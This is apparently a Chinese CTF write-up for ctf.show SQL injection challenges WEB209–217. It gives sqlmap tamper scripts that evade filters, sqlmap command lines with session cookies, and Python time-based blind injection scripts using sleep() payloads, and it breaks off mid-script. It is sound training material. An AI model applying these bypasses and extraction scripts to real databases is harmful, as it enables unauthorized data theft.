title="WEB209"></a>WEB209</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>   <span class="hljs-comment">//TODO 未完工</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ |\*|\=/'</span>, <span class="hljs-variable">$str</span>);<br>  }<br></code></pre></td></tr></tbody></table></figure><p>过滤了空格，<code>*，=，空格</code>，空格和*可以使用%0a代替，=可以使用like代替</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br> <br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br> <br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br> <br>__priority__ = PRIORITY.LOW<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    retVal = payload<br> <br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">""</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br> <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<span class="hljs-number">12</span><br>                    <span class="hljs-keyword">continue</span><br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'\''</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'"'</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'='</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">'like'</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'*'</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br> <br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">" "</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br> <br>            retVal += payload[i]<br> <br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://b99d21e2-6f81-46dd-9ff5-0e9cc844d630.challenge.ctf.show/api/index.php"</span> --dump <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://b99d21e2-6f81-46dd-9ff5-0e9cc844d630.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=ohf9a9h1hfpfj8mu26vpg12j6q"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web209.py<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB210-212"><a href="#WEB210-212" class="headerlink" title="WEB210-212"></a>WEB210-212</h3><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>($id){<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">strrev(base64_decode(strrev(base64_decode($id))))</span>;<br>  }<br></code></pre></td></tr></tbody></table></figure><p>tamper:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br> <br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br> <br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">import</span> base64<br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    retVal = <span class="hljs-string">""</span><br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = base64.b64encode(payload[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">'utf-8'</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">'utf-8'</span>)<br>    <span class="hljs-keyword">return</span> retVal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">""</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'\''</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">'"'</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">"*"</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x31</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">"="</span>:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)+<span class="hljs-string">'like'</span>+<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">" "</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br> <br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://3adfebe9-ccf3-40bd-b259-ebfd26ffd517.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://3adfebe9-ccf3-40bd-b259-ebfd26ffd517.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=69gp4na9nit752dk1lb5jhi7cq"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure><h4 id="WEB211"><a href="#WEB211" class="headerlink" title="WEB211"></a>WEB211</h4><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://ef307896-8ef0-48af-ac70-47667e776942.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://ef307896-8ef0-48af-ac70-47667e776942.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=pbbafdkm6i64e3be1ub9jkccs7"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py -D ctfshow_web --tables<br></code></pre></td></tr></tbody></table></figure><h4 id="WEB212"><a href="#WEB212" class="headerlink" title="WEB212"></a>WEB212</h4><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://c39beb64-3b7a-44ea-bdd5-5073158178e8.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://c39beb64-3b7a-44ea-bdd5-5073158178e8.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=k18m6t540ugepgr9map2l5uup4"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB213"><a href="#WEB213" class="headerlink" title="WEB213"></a>WEB213</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">"http://b310bb9b-1ea5-4781-9602-8bae8bf28b13.challenge.ctf.show/api/index.php"</span> <span class="hljs-attribute">--referer</span>=<span class="hljs-string">"ctf.show"</span> <span class="hljs-attribute">--safe-url</span>=<span class="hljs-string">"http://b310bb9b-1ea5-4781-9602-8bae8bf28b13.challenge.ctf.show/api/getToken.php"</span> <span class="hljs-attribute">--safe-freq</span>=1 <span class="hljs-attribute">--cookie</span>=<span class="hljs-string">"PHPSESSID=u9raci7ij800josv2o8i2n3cpm"</span> <span class="hljs-attribute">--method</span>=<span class="hljs-string">"PUT"</span> <span class="hljs-attribute">-headers</span>=<span class="hljs-string">"content-type:text/plain"</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">"id=1"</span> <span class="hljs-attribute">--tamper</span>=web210.py<br></code></pre></td></tr></tbody></table></figure><p>脚本：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">"""</span><br><span class="hljs-string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span><br><span class="hljs-string">See the file 'LICENSE' for copying permission</span><br><span class="hljs-string">"""</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>__priority__ = PRIORITY.LOW<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = retVal.replace(<span class="hljs-string">"-- -"</span>, <span class="hljs-string">"#"</span>)<br>        retVal = retVal.replace(<span class="hljs-string">" "</span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>].encode(<span class="hljs-string">'utf-8'</span>))<br>        retVal = base64.b64encode(retVal[::-<span class="hljs-number">1</span>]).decode(<span class="hljs-string">'utf-8'</span>)<br><br>    <span class="hljs-keyword">return</span> retVal<br><br></code></pre></td></tr></tbody></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://feced02a-7cae-43a1-ad9c-cc60a4c52c6e.challenge.ctf.show/api/"</span><br><br>result = <span class="hljs-string">""</span><br>i = 0<br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查表</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查字段</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flaga from ctfshow_flagx"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1)"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-comment"># 如果在1s内没有收到回响，则引发异常，requests.exceptions.Timeout异常，表示请求超时。</span><br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></tbody></table></figure><p>超时(查询出的字符大于中位数对应的字符)出现异常，扩大头部，也就是head = mid + 1，未超时则缩小尾部， tail = mid</p><h3 id="WEB215"><a href="#WEB215" class="headerlink" title="WEB215"></a>WEB215</h3><p>提示我们闭合</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://eda56622-960c-49f7-9a59-822d8a3dd023.challenge.ctf.show/api/"</span><br><br>result = <span class="hljs-string">""</span><br>i = 0<br><span class="hljs-keyword">while</span> True:<br>    i = i + 1<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查表</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查字段</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flagaa from ctfshow_flagxc"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"1'or if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1) #"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-comment"># 如果在1s内没有收到回响，则引发异常，requests.exceptions.Timeout异常，表示请求超时。</span><br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB216"><a href="#WEB216" class="headerlink" title="WEB216"></a>WEB216</h3><p>查询语句：</p><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span> = from_base64($<span class="hljs-built_in">id</span>);<br></code></pre></td></tr></tbody></table></figure><p>在SQL中，<code>FROM_BASE64()</code>是一个函数，用于将Base64编码的字符串转换为原始字符串。</p><p>Base64是一种将二进制数据编码为可打印ASCII字符的编码方法。它常用于在不可靠的网络环境中传输二进制数据，或者用于将二进制数据嵌入到文本格式中。Base64编码后的字符串由64个字符组成，包括字母（A-Z，a-z）、数字（0-9）和两个特殊字符（+和/），并且通常以等号（=）结尾。</p><p><code>FROM_BASE64()</code>函数接受一个Base64编码的字符串作为参数，并返回原始的解码后的字符串。它的一般语法如下：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">FROM_BASE64</span><span class="hljs-params">(encoded_string)</span></span><br></code></pre></td></tr></tbody></table></figure><ul><li><code>encoded_string</code> 是一个Base64编码的字符串。</li></ul><p>PY:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">import requests<br><br>url = <span class="hljs-string">"http://0e195a05-4c07-4b7a-bd77-0356fa00be6b.challenge.ctf.show/api/"</span><br>result = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 60):<br>    <span class="hljs-built_in">head</span> = 32<br>    <span class="hljs-built_in">tail</span> = 127<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">head</span> &lt; <span class="hljs-built_in">tail</span>:<br>        mid = (<span class="hljs-built_in">head</span> + <span class="hljs-built_in">tail</span>) &gt;&gt; 1<br>        <span class="hljs-comment"># 查数据库</span><br>        <span class="hljs-comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br>        <span class="hljs-comment"># 查列名字-id.flag</span><br>        <span class="hljs-comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span><br>        <span class="hljs-comment"># 查数据</span><br>        payload = <span class="hljs-string">"select flagaac from ctfshow_flagxcc"</span><br>        data = {<br>            <span class="hljs-string">'ip'</span>: f<span class="hljs-string">"'MQ==') or if (ascii(substr(({payload}),{i},1))&gt;{mid},sleep(1),1"</span>,<br>            <span class="hljs-string">'debug'</span>:<span class="hljs-string">'0'</span><br>        }<br>        try:<br>            r = requests.post(url, data=data, <span class="hljs-built_in">timeout</span>=1)<br>            <span class="hljs-built_in">tail</span> = mid<br>        except Exception as e:<br>            <span class="hljs-built_in">head</span> = mid + 1<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">head</span> != 32:<br>        result += chr(<span class="hljs-built_in">head</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br>    <span class="hljs-built_in">print</span>(result)<br><br><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB217"><a href="#WEB217" class="headerlink" title="WEB217"></a>WEB217</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/sleep/i'</span>,<span class="hljs-variable">$str</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure><p>过滤了sleep,可以尝试Benchmark函数</p><p><strong>Benchmark</strong></p><p>在SQL中，Benchmark函数用于执行重复计算或循环操作，以评估数据库的性能或比较不同查询的执行时间。Benchmark函数的具体语法和行为可能会因数据库管理系统（DBMS）和SQL方言的不同而有所差异。</p><p>一般而言，Benchmark函数的语法如下：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">BENCHMARK(<span class="hljs-params">iterations</span>, <span class="hljs-params">expression</span>)</span><br></code></pre></td></tr></tbody></table></figure><ul><li><code>iterations</code> 是一个整数值，表示要执行的循环迭代次数。</li><li><code>expression</code> 是在每个循环迭代中要执行的表达式或查询。</li></ul><p>Benchmark函数将多次执行给定的表达式或查询，并记录执行的总时间或循环次数。它可以帮助开发人员分析和比较不同查询或表达式的性能，并找出潜在的性能瓶颈或优化机会。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://bdf760c7-f73b-44b4-999c-082b61afb17e.challenge.ctf.show/api/'</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span 